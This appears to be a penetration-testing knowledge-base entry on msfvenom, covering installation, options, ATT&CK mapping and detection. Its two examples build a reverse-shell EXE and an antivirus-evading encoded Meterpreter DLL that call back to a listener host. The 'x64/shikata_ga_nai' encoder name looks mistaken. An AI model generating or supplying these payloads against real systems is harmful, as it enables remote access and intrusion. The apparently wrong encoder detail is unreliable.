---
id: tool-msfvenom-001
url: >-
  https://docs.metasploit.com/docs/using-metasploit/advanced/metasploit-payloads.html
tags:
  - metasploit
  - payload
  - exploitation
type: tool
verified: false
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:19.606Z'
validated: true
submitted: true
---
# msfvenom

**Status**: Unverified

## Overview

msfvenom is a command-line tool from the Metasploit Framework for generating custom payloads, encoders, and executables for penetration testing and exploit development. It is primarily used to create shellcode, DLLs, and EXEs that can be embedded in attacks like DLL hijacking or file drops.

## Description

msfvenom combines MSFencode and msfpayload into a single utility, supporting over 1,000 payloads across platforms. In offensive operations, it's used to craft stealthy payloads for RCE, reverse shells, and post-exploitation. Features include encoding to evade AV, format conversion (e.g., raw to DLL), and template integration.

## Features

- Feature 1: Payload selection from databases (e.g., reverse_tcp, meterpreter)
- Feature 2: Built-in encoders and iteration for obfuscation
- Feature 3: Output in multiple formats (EXE, DLL, ELF, APK)

## Installation

### Requirements

- Ruby 2.7+ and dependencies
- Kali Linux or Metasploit-compatible OS

### Install Commands

```bash
# On Kali/Debian
sudo apt update && sudo apt install metasploit-framework

# Or from source
git clone https://github.com/rapid7/metasploit-framework
cd metasploit-framework && bundle install
```

## Basic Usage

```bash
msfvenom --help
```

## Common Options

| Option | Description |
|--------|-------------|
| `-p` | Payload to use |
| `-f` | Output format |
| `-e` | Encoder for payload |
| `-i` | Encoding iterations |
| `-a` | Architecture (x86, x64) |

## Examples

### Example 1: Basic Usage

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe > shell.exe
```

Generates a reverse shell EXE.

### Example 2: Advanced Usage

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 -f dll -e x64/shikata_ga_nai -i 3 > payload.dll
```

Creates encoded DLL with HTTPS Meterpreter.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Process Injection]]
- [[Obfuscated Files or Information]]

### Tactics

- [[Execution]]
- [[Privilege Escalation]]

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: AV signatures for generated payloads (focus on entropy, strings)
- Detection method 2: Network beacons to common C2 ports during testing

## Related Procedures


## Related Tools

- [[Related Tool: Metasploit Framework]]
- [[Related Tool: Cobalt Strike]]

## References

- Official documentation: https://docs.metasploit.com
- Related resources: PayloadsAllTheThings GitHub
